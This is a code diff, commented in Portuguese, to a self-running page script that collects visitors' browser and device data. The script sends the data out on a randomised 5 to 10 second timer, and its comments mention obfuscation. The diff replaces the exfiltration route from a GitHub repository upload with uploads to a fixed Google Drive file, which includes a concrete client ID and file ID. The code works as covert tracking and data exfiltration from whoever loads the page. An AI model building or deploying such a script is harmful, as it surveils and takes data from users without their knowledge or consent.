@@ -1,5 +1,7 @@
+<script src="https://apis.google.com/js/api.js"></script>
 <script>
 (function() {
+    // Função para gerar uma chave aleatória (para ofuscação)
     function gerarChave() {
         return Math.random().toString(36).substr(2, 8);
     }
@@ -11,37 +13,47 @@
         return dados;
     }
 
-    // Enviar dados para o GitHub via API REST
-    function enviarParaGitHub(dados) {
-        const url = 'https://api.github.com/repos/SEU_USUARIO/SEU_REPOSITORIO/contents/caminho/para/arquivo.json'; // Substitua pela URL da API do seu repositório
-        const token = 'SEU_TOKEN_DE_AUTENTICACAO'; // Substitua com seu token de autenticação do GitHub
-
-        const headers = {
-            'Content-Type': 'application/json',
-            'Authorization': `token ${token}`
-        };
-
-        // Codificar os dados como base64 antes de enviar (necessário para o GitHub API)
-        const dadosBase64 = btoa(dados);
-
-        const body = JSON.stringify({
-            message: 'Atualização de dados coletados',  // Mensagem de commit
-            content: dadosBase64,  // Arquivo codificado em base64
-            branch: 'main'  // A branch onde você deseja armazenar o arquivo
+    // Função para autenticar o usuário com o Google
+    function iniciarAutenticacao() {
+        gapi.auth2.init({
+            client_id: '819636896801-lhecrnpmgem4940dsmrnp8g5dvcgh2rb.apps.googleusercontent.com', // Seu Client ID
+            scope: 'https://www.googleapis.com/auth/drive.file' // Permissões do Google Drive
+        }).then(function () {
+            if (gapi.auth2.getAuthInstance().isSignedIn.get()) {
+                coletarDados(); // Coletar dados após autenticação
+            } else {
+                gapi.auth2.getAuthInstance().signIn().then(function() {
+                    coletarDados(); // Coletar dados após login
+                });
+            }
         });
-
-        // Enviar os dados via fetch
-        fetch(url, {
-            method: 'PUT',
-            headers: headers,
-            body: body
-        })
-        .then(response => response.json())
-        .then(data => console.log('Dados enviados com sucesso:', data))
-        .catch(error => console.error('Erro ao enviar dados:', error));
     }
 
-    // Coletar informações detalhadas
+    // Função para enviar dados para o Google Drive
+    function enviarParaGoogleDrive(dados) {
+        const fileId = '1-74Wo40fWomag36iR5z0i8iVmTIuX_sB'; // ID do arquivo no Google Drive
+        const fileMetadata = {
+            'name': 'dados_coletados.json', // Nome do arquivo
+            'mimeType': 'application/json'
+        };
+        const media = {
+            mimeType: 'application/json',
+            body: JSON.stringify(dados) // Dados no formato JSON
+        };
+
+        // Criar ou atualizar o arquivo no Google Drive
+        gapi.client.drive.files.update({
+            fileId: fileId,
+            resource: fileMetadata,
+            media: media
+        }).then(function(response) {
+            console.log('Arquivo atualizado com sucesso. ID do arquivo:', response.result.id);
+        }, function(error) {
+            console.error('Erro ao enviar para o Google Drive:', error);
+        });
+    }
+
+    // Função para coletar dados do navegador
     function coletarDados() {
         let dados = {
             userAgent: navigator.userAgent,
@@ -72,11 +84,20 @@
             dados.dispositivo.toques = [{ x: 10, y: 15 }];  // Exemplo de toque
         }
 
-        // Ofuscando e enviando os dados para o GitHub
-        enviarParaGitHub(JSON.stringify(dados));
+        // Enviar os dados coletados para o Google Drive
+        enviarParaGoogleDrive(dados);
     }
 
-    // Executando a coleta periodicamente com atraso
-    setInterval(coletarDados, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
+    // Carregar as APIs do Google
+    function carregarAPI() {
+        gapi.load('client:auth2', iniciarAutenticacao);
+    }
+
+    // Chamada para inicializar e carregar a API
+    carregarAPI();
+
+    // Executar a coleta de dados periodicamente
+    setInterval(coletarDados, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000); // Intervalo aleatório de 5 a 10 segundos
+
 })();
 </script>
